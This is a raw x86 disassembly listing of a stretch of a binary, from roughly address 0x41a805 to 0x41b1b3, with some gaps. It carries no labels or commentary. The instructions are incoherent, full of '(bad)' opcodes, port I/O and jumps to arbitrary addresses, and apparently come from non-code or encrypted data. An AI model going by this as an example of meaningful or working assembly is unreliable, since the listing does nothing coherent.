  41a805:	cmp    eax,0xbc8aef97
  41a80a:	xor    dh,BYTE PTR [eax-0x17eb185d]
  41a810:	cmp    eax,0x738b0532
  41a815:	mov    ds:0xa321c07e,eax
  41a81a:	mov    edx,0xd32a4a81
  41a81f:	xor    DWORD PTR [ecx+edi*2+0x10226e11],0x44
  41a827:	jecxz  0x41a85b
  41a829:	sbb    eax,0xb07b3d41
  41a82e:	pop    edi
  41a82f:	outs   dx,BYTE PTR ds:[esi]
  41a830:	leave  
  41a831:	ret    0xa3fc
  41a834:	iret   
  41a835:	outs   dx,DWORD PTR ds:[esi]
  41a836:	rol    BYTE PTR [esi*4+0x68d6c079],0x3
  41a83e:	popf   
  41a83f:	mov    WORD PTR [edx-0x7d710bb0],ss
  41a845:	outs   dx,DWORD PTR ds:[esi]
  41a846:	fisub  DWORD PTR [eax+0x1c]
  41a849:	fadd   QWORD PTR [esi+0x6a]
  41a84c:	pushf  
  41a84d:	icebp  
  41a84e:	in     eax,dx
  41a84f:	je     0x41a8b2
  41a851:	pop    es
  41a852:	out    dx,al
  41a853:	jne    0x41a86c
  41a855:	stos   DWORD PTR es:[edi],eax
  41a856:	sub    ah,cl
  41a858:	inc    edi
  41a859:	imul   ecx,esp,0x3e
  41a85c:	mov    esi,0x420502a1
  41a861:	inc    edx
  41a862:	daa    
  41a863:	jo     0x41a8b1
  41a865:	mov    edx,esi
  41a867:	xchg   ecx,eax
  41a868:	mov    ds:0x2a09bdc4,eax
  41a86d:	xor    DWORD PTR [ebx+0x64d4e5f6],edx
  41a873:	std    
  41a874:	and    DWORD PTR [edx+0x510dbf99],ecx
  41a87a:	push   0xffffffe0
  41a87c:	push   es
  41a87d:	xchg   esi,eax
  41a87e:	pop    ecx
  41a87f:	xchg   edi,eax
  41a880:	mov    ds:0x545a6ba0,eax
  41a885:	outs   dx,DWORD PTR ds:[esi]
  41a886:	mov    ebx,0xbc559ddd
  41a88b:	jbe    0x41a82f
  41a88d:	(bad)  
  41a88e:	mov    cl,0xcf
  41a890:	fimul  DWORD PTR [esi+0x66]
  41a893:	and    BYTE PTR [edi+0x2c78391a],dl
  41a899:	push   ds
  41a89a:	cli    
  41a89b:	mov    eax,0x69252925
  41a8a0:	or     eax,0x9faf808d
  41a8a5:	pop    eax
  41a8a6:	pop    edi
  41a8a7:	add    DWORD PTR [ebp+0x5],edi
  41a8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ab:	ds push edi
  41a8ad:	cmp    BYTE PTR [ecx],0xe4
  41a8b0:	lods   al,BYTE PTR ds:[esi]
  41a8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b2:	xchg   edx,eax
  41a8b3:	mov    ch,0x7d
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x9168323e,al
  41a924:	ret    0xde85
  41a927:	pop    ss
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [esi+0x82ea38f],dl
  41a933:	xor    BYTE PTR [ebp+0x38a43321],0xb4
  41a93a:	mov    DWORD PTR [ebx-0x35],eax
  41a93d:	and    BYTE PTR [ecx],bh
  41a93f:	daa    
  41a940:	inc    edi
  41a941:	pop    ds
  41a942:	out    0x74,al
  41a944:	push   eax
  41a945:	add    DWORD PTR [esi+ebp*8],esi
  41a948:	pop    edx
  41a949:	imul   edx,DWORD PTR [eax],0xf252e213
  41a94f:	mov    dh,0x14
  41a951:	add    bl,BYTE PTR [esi-0x3f]
  41a954:	push   edx
  41a955:	add    al,0x4b
  41a957:	test   eax,0x3a5821a9
  41a95c:	add    eax,0x6c779096
  41a961:	mov    WORD PTR [eax-0x3ebd6d43],cs
  41a967:	adc    ebp,DWORD PTR [bp+0x78]
  41a96b:	inc    esi
  41a96c:	dec    ebp
  41a96d:	shr    BYTE PTR [edx+0xa09f34b],1
  41a973:	add    ebp,DWORD PTR es:[eax-0x1e]
  41a977:	mov    ecx,0x9fd5c224
  41a97c:	(bad)  
  41a97d:	xor    ebx,DWORD PTR [ebx]
  41a97f:	sbb    eax,0x5d2fb502
  41a984:	push   edx
  41a985:	out    0x8b,al
  41a987:	cld    
  41a988:	dec    esi
  41a989:	and    eax,0x54219c9b
  41a98e:	mov    DWORD PTR [ecx+0x70],edi
  41a991:	(bad)  
  41a992:	dec    ecx
  41a993:	adc    eax,0xcff98a9a
  41a998:	jo     0x52096159
  41a99e:	popa   
  41a99f:	aaa    
  41a9a0:	aad    0x27
  41a9a2:	mov    ss,WORD PTR [eax+0x35]
  41a9a5:	cli    
  41a9a6:	aaa    
  41a9a7:	mov    ch,0x3c
  41a9a9:	int3   
  41a9aa:	ja     0x41a942
  41a9ac:	arpl   WORD PTR [edi-0x76],di
  41a9af:	xor    eax,DWORD PTR [esi+0x576632af]
  41a9b5:	je     0x41aa30
  41a9b7:	lds    ebp,FWORD PTR [esi]
  41a9b9:	ds mov cl,0xcb
  41a9bc:	in     eax,0x5
  41a9be:	outs   dx,DWORD PTR ds:[esi]
  41a9bf:	stos   DWORD PTR es:[edi],eax
  41a9c0:	cmp    edi,DWORD PTR [eax+0x6479ded3]
  41a9c6:	test   edi,esp
  41a9c8:	xor    ecx,edx
  41a9ca:	retf   0x2658
  41a9cd:	pushf  
  41a9ce:	dec    esi
  41a9cf:	clc    
  41a9d0:	mov    cl,0x24
  41a9d2:	mov    WORD PTR [edx-0x52],es
  41a9d5:	enter  0xa868,0x9f
  41a9d9:	in     al,0xeb
  41a9db:	call   0x654b07e
  41a9e0:	mov    ecx,0x8b514252
  41a9e5:	mov    dl,0x56
  41a9e7:	mov    eax,fs
  41a9e9:	jns    0x41aa15
  41a9eb:	sbb    DWORD PTR [edi+0x3e],edi
  41a9ee:	repz (bad) 
  41a9f1:	sbb    BYTE PTR [esi+esi*2+0x3aa12039],0x2
  41a9f9:	inc    edi
  41a9fa:	dec    eax
  41a9fb:	aam    0x5
  41a9fd:	dec    edx
  41a9fe:	adc    edi,eax
  41aa00:	loope  0x41aa33
  41aa02:	pop    eax
  41aa03:	mov    WORD PTR [edx],es
  41aa05:	mov    ebp,0xdfda52a8
  41aa0a:	adc    eax,0x369a4801
  41aa0f:	cwde   
  41aa10:	or     DWORD PTR [eax],0x7538c38c
  41aa16:	or     DWORD PTR [ebx+0x52862131],ecx
  41aa1c:	stos   BYTE PTR es:[edi],al
  41aa1d:	mov    bh,BYTE PTR [esp+edx*2+0xf]
  41aa21:	adc    BYTE PTR [edi],dl
  41aa23:	fistp  QWORD PTR [esi+0x5e]
  41aa26:	mov    bh,0xc3
  41aa28:	push   0x360a86dd
  41aa2d:	push   edi
  41aa2e:	stos   DWORD PTR es:[edi],eax
  41aa2f:	(bad)  
  41aa30:	scas   al,BYTE PTR es:[edi]
  41aa31:	fcomp  QWORD PTR [esi]
  41aa33:	cwde   
  41aa34:	pop    ss
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0xfbe6e277,al
  41aaa4:	add    dl,cl
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [esi-0x32],dl
  41aab0:	stc    
  41aab1:	loop   0x41aad7
  41aab3:	pop    esp
  41aab4:	dec    edi
  41aab5:	pushf  
  41aab6:	inc    ebx
  41aab7:	(bad)
  41aabc:	iret   
  41aabd:	stc    
  41aabe:	sub    DWORD PTR [edi],eax
  41aac0:	add    DWORD PTR [ecx-0x6b31d844],esp
  41aac6:	aad    0x63
  41aac8:	bound  esi,QWORD PTR [ecx]
  41aaca:	push   ds
  41aacb:	ds leave 
  41aacd:	mov    ch,0x3a
  41aacf:	sbb    DWORD PTR [edi+ecx*1+0x29bc7428],eax
  41aad6:	xor    dl,BYTE PTR [eax+0x27]
  41aad9:	or     dh,ch
  41aadb:	jmp    0x41ab0a
  41aadd:	push   ebx
  41aade:	mov    ebx,0x593c45c6
  41aae3:	movlps QWORD PTR [ebx-0x4995797a],xmm4
  41aaea:	sahf   
  41aaeb:	xchg   BYTE PTR [edx],dl
  41aaed:	mov    DWORD PTR [eax+0x58],esp
  41aaf0:	hlt    
  41aaf1:	pushf  
  41aaf2:	and    bl,BYTE PTR [eax+0x619f9edd]
  41aaf8:	jns    0x41aa80
  41aafa:	add    ebx,eax
  41aafc:	sbb    esi,DWORD PTR [edx+eiz*4+0x6d]
  41ab00:	mov    eax,ds:0x37e116ce
  41ab05:	inc    esp
  41ab06:	imul   BYTE PTR [eax]
  41ab08:	mov    cl,0x69
  41ab0a:	push   0x1ad0ad98
  41ab0f:	xchg   esp,eax
  41ab10:	adc    DWORD PTR [edi],esp
  41ab12:	inc    edx
  41ab13:	fmul   st(3),st
  41ab15:	sub    dl,BYTE PTR [esi-0x411c43db]
  41ab1b:	jne    0x41ab84
  41ab1d:	pop    esp
  41ab1e:	(bad)
  41ab21:	out    0xde,al
  41ab23:	mov    ebx,0x5208b828
  41ab28:	jge    0x41ab93
  41ab2a:	sub    esp,DWORD PTR [esi+0x6c]
  41ab2d:	das    
  41ab2e:	dec    ecx
  41ab2f:	xor    BYTE PTR [eax+0x57c0f6ae],ch
  41ab35:	sbb    al,0xb
  41ab37:	or     DWORD PTR [ecx+ebx*2-0x6c9b2e81],esp
  41ab3e:	dec    edi
  41ab3f:	ja     0x41ab9c
  41ab41:	cli    
  41ab42:	pusha  
  41ab43:	fsub   QWORD PTR [edx-0x4e]
  41ab46:	sbb    edx,0xfd92d8ac
  41ab4c:	mov    al,ds:0xa90a9ed0
  41ab51:	mov    esp,0x615873a7
  41ab56:	mov    ecx,0xffec9b12
  41ab5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab5c:	pop    edx
  41ab5d:	mov    al,0xeb
  41ab5f:	outs   dx,DWORD PTR ds:[esi]
  41ab60:	aad    0x5c
  41ab62:	add    edx,edi
  41ab64:	mov    ah,0x51
  41ab66:	xchg   ecx,eax
  41ab67:	retf   
  41ab68:	aad    0x15
  41ab6a:	mov    ?,WORD PTR [edx]
  41ab6c:	(bad)  
  41ab6d:	cmc    
  41ab6e:	cmp    al,dl
  41ab70:	and    al,0xf5
  41ab72:	push   esi
  41ab73:	test   dl,dh
  41ab75:	inc    edx
  41ab76:	mov    al,ds:0x16dc6ab
  41ab7b:	xchg   esi,eax
  41ab7c:	out    dx,al
  41ab7d:	sbb    DWORD PTR ds:0x2243d742,ecx
  41ab83:	mov    eax,0xe503a7bf
  41ab88:	dec    esi
  41ab89:	push   esi
  41ab8a:	test   BYTE PTR [esi-0x31],bh
  41ab8d:	popa   
  41ab8e:	pop    ds
  41ab8f:	mov    ebp,0xec1525f4
  41ab94:	sub    edi,DWORD PTR es:[ecx-0x3b]
  41ab98:	gs dec eax
  41ab9a:	xchg   esp,eax
  41ab9b:	pop    esp
  41ab9c:	fs pop edx
  41ab9e:	repnz in al,dx
  41aba0:	fisub  DWORD PTR ds:0x95a1b330
  41aba6:	into   
  41aba7:	shr    BYTE PTR [edi+0xa],cl
  41abaa:	aad    0x1f
  41abac:	ror    BYTE PTR [edi-0x15],0x96
  41abb0:	mov    esi,0x1c3c8d2b
	...
  41ac15:	add    BYTE PTR [edx+0x49],ch
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0x1062cc53
  41ac24:	pop    es
  41ac25:	stos   DWORD PTR es:[edi],eax
  41ac26:	in     al,dx
  41ac27:	sbb    DWORD PTR [ecx],eax
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [esi],bl
  41ac2f:	cdq    
  41ac30:	sbb    esp,DWORD PTR [esi+0x661ca3de]
  41ac36:	inc    esp
  41ac37:	loop   0x41abcd
  41ac39:	mov    bh,0xd3
  41ac3b:	imul   edi,DWORD PTR [ecx-0x5d],0x76
  41ac3f:	xor    al,0xe3
  41ac41:	fdivr  st(7),st
  41ac43:	pop    ds
  41ac44:	call   0xff5c0d4e
  41ac49:	outs   dx,BYTE PTR ds:[esi]
  41ac4a:	outs   dx,DWORD PTR ds:[esi]
  41ac4b:	jge    0x41ac42
  41ac4d:	shr    edx,1
  41ac4f:	ror    BYTE PTR [ecx-0x2d4755cc],cl
  41ac55:	cmp    DWORD PTR [edi+0x3ffa65bb],eax
  41ac5b:	mov    ds,ebx
  41ac5d:	add    ebx,0xd19052ba
  41ac63:	xor    al,0xbd
  41ac65:	mov    edx,0x8530fb62
  41ac6a:	adc    edx,DWORD PTR [esi+ebx*2+0x0]
  41ac6e:	dec    ebx
  41ac6f:	mov    al,BYTE PTR [ebx+0x6b]
  41ac72:	addr16 mov ebp,0x30db5fe0
  41ac78:	repnz outs dx,DWORD PTR ds:[esi]
  41ac7a:	and    al,0xe
  41ac7c:	mov    edx,0xcff63809
  41ac81:	mov    esp,0xc70548e7
  41ac86:	ds or  eax,0x966ccf4d
  41ac8c:	add    ebp,DWORD PTR [edx]
  41ac8e:	shl    BYTE PTR [ecx],0x3c
  41ac91:	jb     0x41acc3
  41ac93:	xchg   ebp,eax
  41ac94:	jg     0x41ace5
  41ac96:	stos   BYTE PTR es:[edi],al
  41ac97:	iret   
  41ac98:	push   edi
  41ac99:	xchg   DWORD PTR [ebp-0x4a458c7a],esp
  41ac9f:	xchg   ecx,eax
  41aca0:	sti    
  41aca1:	jl     0x41accf
  41aca3:	mov    cl,BYTE PTR [eax+0x2d3efa74]
  41aca9:	jle    0x41ad1f
  41acab:	sbb    eax,0x8cedb26a
  41acb0:	leave  
  41acb1:	or     BYTE PTR [edi-0x45],cl
  41acb4:	out    0xf2,al
  41acb6:	jle    0x41acb5
  41acb8:	push   0xa48ba164
  41acbd:	mov    esi,0x11f8a6c3
  41acc2:	stc    
  41acc3:	xchg   ecx,eax
  41acc4:	inc    esi
  41acc5:	or     edx,ecx
  41acc7:	and    al,0xa1
  41acc9:	mov    ebp,0x99995fe6
  41accf:	xchg   ecx,eax
  41acd0:	lahf   
  41acd1:	jbe    0x41acf3
  41acd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acd4:	pusha  
  41acd5:	sbb    ch,dh
  41acd7:	loope  0x41ac80
  41acd9:	and    dl,BYTE PTR [ebx-0x1]
  41acdc:	adc    dh,BYTE PTR [esi-0x4b72c501]
  41ace2:	adc    DWORD PTR ss:[eax],esp
  41ace5:	out    dx,eax
  41ace6:	xchg   esi,eax
  41ace7:	adc    eax,0x7146ab40
  41acec:	push   edi
  41aced:	(bad)  
  41acee:	dec    ebx
  41acef:	aam    0x5b
  41acf1:	loop   0x41acd6
  41acf3:	pushf  
  41acf4:	les    esi,FWORD PTR [edx]
  41acf6:	out    0x72,al
  41acf8:	cld    
  41acf9:	inc    esp
  41acfa:	es pop ebp
  41acfc:	sbb    eax,0x4c272158
  41ad01:	lahf   
  41ad02:	mov    al,0x9d
  41ad04:	das    
  41ad05:	js     0x41ad7f
  41ad07:	leave  
  41ad08:	retf   0xab81
  41ad0b:	scas   al,BYTE PTR es:[edi]
  41ad0c:	hlt    
  41ad0d:	pop    eax
  41ad0e:	je     0x41acf1
  41ad10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad11:	xor    esp,DWORD PTR [esi+ebp*1-0x68]
  41ad15:	mov    ecx,0xa5f36f5b
  41ad1a:	outs   dx,BYTE PTR ds:[esi]
  41ad1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad1c:	add    DWORD PTR [edi+0xb],esi
  41ad1f:	xchg   ebx,eax
  41ad20:	jmp    0xea5a:0x61899706
  41ad27:	fcmovnb st,st(6)
  41ad29:	jg     0x41ad3e
  41ad2b:	add    cl,cl
  41ad2d:	inc    esi
  41ad2e:	(bad)  
  41ad2f:	pop    ebp
  41ad30:	xchg   ch,ch
  41ad32:	daa    
  41ad33:	inc    esi
  41ad34:	cmp    BYTE PTR [eax],al
	...
  41ad96:	push   ebp
  41ad97:	clc    
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ecx,DWORD PTR [edx+eax*4-0x3e]
  41ada5:	aas    
  41ada6:	repz sbb al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [ecx+0x28],bl
  41adb0:	push   ecx
  41adb1:	scas   eax,DWORD PTR es:[edi]
  41adb2:	retf   
  41adb3:	xor    DWORD PTR [ecx+0x4],edi
  41adb6:	fucomip st,st(3)
  41adb8:	fmulp  st(6),st
  41adba:	fadd   QWORD PTR [ecx]
  41adbc:	mov    bl,0xf3
  41adbe:	inc    ebp
  41adbf:	mov    eax,esp
  41adc1:	sbb    al,0x17
  41adc3:	mov    ebp,0xbfe12464
  41adc8:	test   DWORD PTR [ebx+0x1e],ecx
  41adcb:	inc    esi
  41adcc:	ds (bad) 
  41adce:	cli    
  41adcf:	mov    cl,0x86
  41add1:	xchg   ebx,eax
  41add2:	mov    ah,0x2c
  41add4:	test   DWORD PTR [esi],ecx
  41add6:	lea    ebx,[ebx+0x4c490420]
  41addc:	mov    ds:0x6bcd3cdb,eax
  41ade1:	int    0xc1
  41ade3:	xchg   BYTE PTR [ebx-0x44],bl
  41ade6:	pop    ss
  41ade7:	adc    eax,0x14636cbb
  41adec:	inc    ebx
  41aded:	lods   eax,DWORD PTR ds:[esi]
  41adee:	lods   eax,DWORD PTR ds:[esi]
  41adef:	ja     0x41ad94
  41adf1:	xchg   DWORD PTR [ebx+0x78a41371],ecx
  41adf7:	sub    al,0xfa
  41adf9:	or     DWORD PTR [ecx+ebx*4+0x41],esp
  41adfd:	push   ds
  41adfe:	stos   BYTE PTR es:[edi],al
  41adff:	mov    ebx,0xf4cffc5d
  41ae04:	fimul  DWORD PTR ds:0x9b22eaa7
  41ae0a:	xchg   ebx,eax
  41ae0b:	or     BYTE PTR [ebx-0x71a89bb4],ch
  41ae11:	in     eax,dx
  41ae12:	jmp    0x41adb2
  41ae14:	adc    al,BYTE PTR [eax+0x25]
  41ae17:	mov    edi,0xd9045405
  41ae1c:	jle    0x41ade0
  41ae1e:	pop    ss
  41ae1f:	test   DWORD PTR [eax-0x76],0x98389b59
  41ae26:	in     al,0x4b
  41ae28:	mov    al,0x18
  41ae2a:	lds    ebx,FWORD PTR [edi+0x74]
  41ae2d:	and    esp,ecx
  41ae2f:	xchg   ebx,eax
  41ae30:	dec    edx
  41ae31:	ja     0x41ae2c
  41ae33:	scas   eax,DWORD PTR es:[edi]
  41ae34:	dec    ecx
  41ae35:	adc    ch,bl
  41ae37:	sub    eax,0x94f1d212
  41ae3c:	adc    al,0xbd
  41ae3e:	mov    ebp,0x35196163
  41ae43:	xor    eax,0xd49c4289
  41ae48:	mov    esp,0xc64880fe
  41ae4d:	mov    ebx,DWORD PTR [ecx]
  41ae4f:	mov    dh,0xee
  41ae51:	test   eax,0x54c96db9
  41ae56:	shl    DWORD PTR [ebp*4-0x6f93a796],1
  41ae5d:	mov    cl,0xf2
  41ae5f:	or     DWORD PTR [ebx],0xffffffb9
  41ae62:	mov    ebp,0x976fd5fb
  41ae67:	add    BYTE PTR [esi+ebp*1+0xa],cl
  41ae6b:	and    al,0xad
  41ae6d:	dec    esp
  41ae6e:	sbb    al,0xd7
  41ae70:	leave  
  41ae71:	mov    esi,0x3d1f304
  41ae76:	aas    
  41ae77:	mov    dh,0x64
  41ae79:	sub    al,0x9d
  41ae7b:	(bad)  
  41ae7c:	cld    
  41ae7d:	loop   0x41aedc
  41ae7f:	jecxz  0x41ae73
  41ae81:	push   esi
  41ae82:	retf   0x8449
  41ae85:	lahf   
  41ae86:	fnstenv [ebx-0x6f268cb0]
  41ae8c:	sub    ch,BYTE PTR [ecx+ebp*1-0x16]
  41ae90:	adc    al,0x4c
  41ae92:	dec    cx
  41ae94:	js     0x41ae5c
  41ae96:	aas    
  41ae97:	dec    edi
  41ae98:	ja     0x41ae9d
  41ae9a:	rol    DWORD PTR [eax-0x136c4fde],cl
  41aea0:	xlat   BYTE PTR ds:[ebx]
  41aea1:	out    0x9b,eax
  41aea3:	pushf  
  41aea4:	xchg   ecx,eax
  41aea5:	cvttps2pi mm2,QWORD PTR [eax-0x74]
  41aea9:	mov    ch,0x24
  41aeab:	sub    eax,0xbb66ae62
  41aeb0:	cmp    eax,0x830c4acf
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af46
  41af23:	or     DWORD PTR [ecx+0x11bfa5d],ecx
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [ebp+0x18269f0],dl
  41af33:	out    dx,al
  41af34:	mov    esp,DWORD PTR [ecx]
  41af36:	fmul   QWORD PTR [ecx+0x6be4fd97]
  41af3c:	lock pushf 
  41af3e:	pop    esi
  41af3f:	pop    edx
  41af40:	out    0xc7,al
  41af42:	call   ebp
  41af44:	mov    bh,0xc4
  41af46:	test   al,0x74
  41af48:	test   ecx,ebp
  41af4a:	shr    ah,0xa3
  41af4d:	repz shl DWORD PTR [eax+0x58],cl
  41af51:	mov    ch,0x5f
  41af53:	sbb    al,0x4a
  41af55:	out    0xf4,eax
  41af57:	aas    
  41af58:	add    eax,edx
  41af5a:	inc    esp
  41af5b:	pop    ebx
  41af5c:	xor    ebx,ebp
  41af5e:	mov    ecx,0xb889d970
  41af63:	rcr    ebp,1
  41af65:	jg     0x41af12
  41af67:	cdq    
  41af68:	inc    eax
  41af69:	mov    dl,0x58
  41af6b:	pop    edx
  41af6c:	dec    ebp
  41af6d:	push   ecx
  41af6f:	mov    bl,0x99
  41af71:	in     eax,dx
  41af72:	in     al,dx
  41af73:	push   ss
  41af74:	mov    al,0x2
  41af76:	iret   
  41af77:	pop    es
  41af78:	mov    dl,0x7f
  41af7a:	mov    edi,0x505c8eaa
  41af7f:	rcl    DWORD PTR [ecx-0x5ad1af85],0x6b
  41af86:	repnz push 0x908b5d13
  41af8c:	stos   BYTE PTR es:[edi],al
  41af8d:	call   FWORD PTR [edi-0x141c8161]
  41af93:	inc    ebp
  41af94:	loopne 0x41af6e
  41af96:	sub    DWORD PTR [ecx+0x5f901f54],0x63261a1a
  41afa0:	push   esp
  41afa1:	popf   
  41afa2:	stc    
  41afa3:	cmp    al,BYTE PTR [ecx+ebx*1+0x6]
  41afa7:	leave  
  41afa8:	mov    ch,0xa9
  41afaa:	loop   0x41afa5
  41afac:	cmp    BYTE PTR [eax+0x38cf6136],al
  41afb2:	cmp    DWORD PTR [edx],ecx
  41afb4:	lods   al,BYTE PTR ds:[esi]
  41afb5:	call   0x261a244e
  41afba:	mov    eax,ds:0x72c87c64
  41afbf:	jb     0x41afd3
  41afc1:	xchg   ebx,eax
  41afc2:	out    0x8e,al
  41afc4:	and    dh,dh
  41afc6:	cdq    
  41afc7:	push   es
  41afc8:	dec    esp
  41afc9:	jg     0x41afac
  41afcb:	std    
  41afcc:	add    DWORD PTR [edx+0x5b],0xa551bb70
  41afd3:	stos   DWORD PTR es:[edi],eax
  41afd4:	jecxz  0x41b024
  41afd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd7:	mov    dh,0x64
  41afd9:	ss mov edi,0xfec0ed92
  41afdf:	and    BYTE PTR [eax-0x7c783c1f],0x37
  41afe6:	jne    0x41af7e
  41afe8:	mov    esi,0x8c064b22
  41afed:	xchg   edi,eax
  41afee:	or     BYTE PTR [ebp-0x48],dh
  41aff1:	pushf  
  41aff2:	pop    edx
  41aff3:	xchg   esp,eax
  41aff4:	sub    BYTE PTR [eax+0x3d],ch
  41aff7:	pop    ebp
  41aff8:	rcr    DWORD PTR [ebp+edi*8+0x38f8c082],1
  41afff:	dec    esp
  41b000:	cmc    
  41b001:	cmp    BYTE PTR [ebx+edx*8],0x64
  41b005:	mov    al,0x7a
  41b007:	popa   
  41b008:	dec    edi
  41b009:	fidivr WORD PTR [edi-0x39]
  41b00c:	inc    ecx
  41b00d:	gs inc eax
  41b00f:	(bad)  [esi-0x72]
  41b012:	or     edi,ebx
  41b014:	cld    
  41b015:	into   
  41b016:	fwait
  41b017:	xor    al,0xe2
  41b019:	outs   dx,BYTE PTR ds:[esi]
  41b01a:	popf   
  41b01b:	mov    DWORD PTR [eax+ebp*2-0x56],0x5c0cf699
  41b023:	mov    ds:0x1123bda9,al
  41b028:	outs   dx,DWORD PTR ds:[esi]
  41b029:	add    bl,ah
  41b02b:	fnsave [edx+edi*8-0x142a9d63]
  41b032:	sbb    esi,DWORD PTR [esp+eax*2+0x0]
	...
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x6ec18acf]
  41b0a5:	out    0x1,eax
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	div    BYTE PTR [esi+0x32a68dbc]
  41b0b4:	iret   
  41b0b5:	lods   eax,DWORD PTR ds:[esi]
  41b0b6:	sti    
  41b0b7:	ja     0x41b0fd
  41b0b9:	retf   0x5c54
  41b0bc:	cmc    
  41b0bd:	das    
  41b0be:	dec    esi
  41b0bf:	jmp    0x64bd206a
  41b0c4:	push   ebp
  41b0c5:	jnp    0x41b0c0
  41b0c7:	ds xchg ebp,eax
  41b0c9:	dec    esi
  41b0ca:	push   0x319f8039
  41b0cf:	imul   ecx,DWORD PTR [ecx+0x78224756],0xdeefb33d
  41b0d9:	div    BYTE PTR [esi-0x54]
  41b0dc:	xor    DWORD PTR [esi],0x28
  41b0df:	stc    
  41b0e0:	call   0x33c6:0x6d51f8d4
  41b0e7:	cmc    
  41b0e8:	int3   
  41b0e9:	mov    al,ds:0x6603c563
  41b0ee:	inc    esi
  41b0ef:	mov    ch,0x70
  41b0f1:	mov    al,0x46
  41b0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f4:	xchg   ecx,eax
  41b0f5:	loopne 0x41b10c
  41b0f7:	jg     0x41b0b9
  41b0f9:	cwde   
  41b0fa:	pop    edi
  41b0fb:	mov    edx,0x12f91048
  41b100:	mov    ebp,DWORD PTR [esi-0x3eebc681]
  41b106:	sub    BYTE PTR [ecx+0x4985d1f2],ch
  41b10c:	push   esi
  41b10d:	arpl   WORD PTR gs:[esi+0x3c],bp
  41b111:	pop    ds
  41b112:	mov    ah,0x2c
  41b114:	fstp   DWORD PTR [ecx+0x5a]
  41b117:	jecxz  0x41b112
  41b119:	lock outs dx,DWORD PTR ds:[esi]
  41b11b:	in     eax,dx
  41b11c:	inc    ebx
  41b11d:	std    
  41b11e:	test   esp,edx
  41b120:	aam    0x84
  41b122:	ins    DWORD PTR es:[edi],dx
  41b123:	cmp    eax,0xed1b7b64
  41b128:	jne    0x41b117
  41b12a:	mov    edi,0xc2468530
  41b12f:	sub    esp,DWORD PTR [ebp-0x49b35754]
  41b135:	pop    eax
  41b136:	stc    
  41b137:	fsub   st(2),st
  41b139:	jno    0x41b13d
  41b13b:	push   eax
  41b13c:	nop
  41b13d:	test   bl,al
  41b13f:	adc    DWORD PTR ds:0xeeaecb17,ecx
  41b145:	outs   dx,DWORD PTR ds:[esi]
  41b146:	iret   
  41b147:	xor    ecx,DWORD PTR [ebx-0x59]
  41b14a:	mov    es,ecx
  41b14c:	mov    bh,0x97
  41b14e:	shr    DWORD PTR [eax-0x40],1
  41b151:	and    dh,BYTE PTR [ebx+0x2e]
  41b154:	aad    0x4a
  41b156:	adc    dh,BYTE PTR [edi+0x18]
  41b159:	(bad)  
  41b15a:	shl    dl,0x22
  41b15d:	and    eax,0x6c8427cb
  41b162:	jnp    0x41b1ba
  41b164:	dec    eax
  41b165:	mov    eax,ds:0xab8f4277
  41b16a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b16b:	call   0xbbf68c25
  41b170:	test   BYTE PTR [eax],al
  41b172:	inc    esp
  41b173:	or     DWORD PTR [ebx-0x291e474b],0xffffffb5
  41b17a:	dec    ecx
  41b17b:	in     al,0xd0
  41b17d:	inc    edi
  41b17e:	adc    al,0x86
  41b180:	pop    edx
  41b181:	and    bl,BYTE PTR [ebp-0x571617e0]
  41b187:	xor    al,0xd1
  41b189:	(bad)  
  41b18a:	arpl   WORD PTR [eax+0x18],bx
  41b18d:	jecxz  0x41b128
  41b18f:	scas   eax,DWORD PTR es:[edi]
  41b190:	and    DWORD PTR [edi-0x193b7bb7],0xffffffd6
  41b197:	aaa    
  41b198:	fdiv   st,st(3)
  41b19a:	out    0x76,al
  41b19c:	push   edx
  41b19d:	mov    esp,0x84c0abb3
  41b1a2:	(bad)  
  41b1a3:	aam    0x73
  41b1a5:	pop    edi
  41b1a6:	int    0xa1
  41b1a8:	leave  
  41b1a9:	and    ecx,ebp
  41b1ab:	pusha  
  41b1ac:	fidiv  WORD PTR [ecx+eax*4-0x8]
  41b1b0:	mov    cl,BYTE PTR [edi-0xa]
  41b1b3:	xchg   ebp,eax
